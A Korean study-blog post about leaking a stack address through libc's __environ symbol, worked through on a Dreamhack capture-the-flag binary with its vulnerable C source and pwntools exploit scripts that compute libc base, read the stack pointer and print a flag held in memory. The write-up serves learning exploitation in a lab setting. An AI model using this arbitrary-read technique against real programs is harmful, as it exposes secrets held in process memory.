---
title: "[PWNABLE] environ stack leak"
description: "__environ을 이용한 스택 주소 leak__environ은 환경 변수 중 하나로 시스템의 정보를 갖고 있는 변수이다.(execve 계열의 함수가 참조한다.)libc파일에서 심볼을 찾을 수 있다. environ에 들어있는 값을 확인한 모습이다. 해당 부분들이 stack 영역에 속하는 것 또한 알 수 있다. 전체적인 내"
date: "2024-06-24"
translation_key: "tistory-8beaf703795a"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-environ-stack-leak"
private: false
---

### \_\_environ을 이용한 스택 주소 leak

\_\_environ은 환경 변수 중 하나로 시스템의 정보를 갖고 있는 변수이다.

(execve 계열의 함수가 참조한다.)

![](/assets/images/tistory/tistory-8beaf703795a/001.png)

libc파일에서 심볼을 찾을 수 있다.

![](/assets/images/tistory/tistory-8beaf703795a/002.png)

![](/assets/images/tistory/tistory-8beaf703795a/003.png)

environ에 들어있는 값을 확인한 모습이다.

![](/assets/images/tistory/tistory-8beaf703795a/004.png)

해당 부분들이 stack 영역에 속하는 것 또한 알 수 있다.

![](/assets/images/tistory/tistory-8beaf703795a/005.png)

전체적인 내용이다.

![](/assets/images/tistory/tistory-8beaf703795a/006.png)

\_init()이 실행될 때 호출되어 사용되는 듯 하다.

* * *

#### dreamhack - \_\_envirion

```
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>

void sig_handle() {
  exit(0);
}
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  signal(SIGALRM, sig_handle);
  alarm(5);
}

void read_file() {
  char file_buf[4096];

  int fd = open("./flag", O_RDONLY);
  read(fd, file_buf, sizeof(file_buf) - 1);
  close(fd);
}
int main() {
  char buf[1024];
  long addr;
  int idx;

  init();
  read_file();

  printf("stdout: %p\n", stdout);

  while (1) {
    printf("> ");
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        printf("Addr: ");
        scanf("%ld", &addr);
        printf("%s", (char *)addr);
        break;
      default:
        break;
    }
  }
  return 0;
}
```

파일을 실행하면 아래와 같이 stdout 라이브러리 주소를 출력하고 있다.

![](/assets/images/tistory/tistory-8beaf703795a/007.png)

그리고 반복해서 addr이라는 변수의 주소에 값을 입력한다.

stdout의 주소를 leak해주었으므로 libc\_base를 구할 수 있다.

이를 통해 \_\_environ까지 구할 수 있다.

계속해서 addr이 가리키는 값을 출력을 해주므로 해당 주소가 ./flag를 가리키게 만들어야 한다.

```
from pwn import*

p = process(['./environ'],env={'LD_PRELOAD':'./libc.so.6'})
e = ELF('./environ')
libc = ELF('./libc.so.6')

context.log_level = 'debug'

p.recvuntil(b": ")
stdout = int(p.recvn(14),16)

stdout_offset = libc.sym['_IO_2_1_stdout_']
environ_offset = libc.sym['__environ']

libc_base = stdout-stdout_offset
environ = libc_base + environ_offset

print("stdout@add : ",hex(stdout))
print("libc_base@add : ",hex(libc_base))
print("environ@add : ", hex(environ))
p.interactive()
```

libc\_base와 environ의 주소를 구하는 페이로드 초안이다.

이제 flag파일을 읽는 read\_file 함수를 이용하여 스택 간격을 구해야 한다.

![](/assets/images/tistory/tistory-8beaf703795a/008.png)

파일을 열고 내용을 읽는 부분이다.

읽을 대상이 rsi, rcx 레지스터에 들어가 있는 것을 볼 수 있다.

![](/assets/images/tistory/tistory-8beaf703795a/009.png)

현재 확인된 정보이다.

높은 주소에서 낮은 주소를 빼면 0x1568이라는 차이가 나온다.

![](/assets/images/tistory/tistory-8beaf703795a/010.png)

먼저 구한 environ의 주소에 들어있는 값을 leak하고,

rsi에 있는 주소를 가리키 설정해주어야 한다.

그렇게 수정한 코드이다.

```
from pwn import*

p = process(['./environ'],env={'LD_PRELOAD':'./libc.so.6'})
e = ELF('./environ')
libc = ELF('./libc.so.6')

context.log_level = 'debug'

p.recvuntil(b": ")
stdout = int(p.recvn(14),16)

stdout_offset = libc.sym['_IO_2_1_stdout_']
environ_offset = libc.sym['__environ']

libc_base = stdout-stdout_offset
environ = libc_base + environ_offset

print("stdout@add : ",hex(stdout))
print("libc_base@add : ",hex(libc_base))
print("environ@add : ", hex(environ))

p.sendlineafter(b">",b"1")
p.sendlineafter(b":",str(environ))
p.recvuntil('\x20')

environ_val = u64(p.recvn(6).ljust(8,b'\x00'))
print("environ_val : ",hex(environ_val))

flag_add = environ_val - 0x1568
print("flag_add : ",flag_add)

p.sendlineafter(b">",b"1")
p.sendlineafter(b":",str(flag_add))
p.interactive()
```

![](/assets/images/tistory/tistory-8beaf703795a/011.png)

실행하면 flag가 출력되는 것을 볼 수 있다.
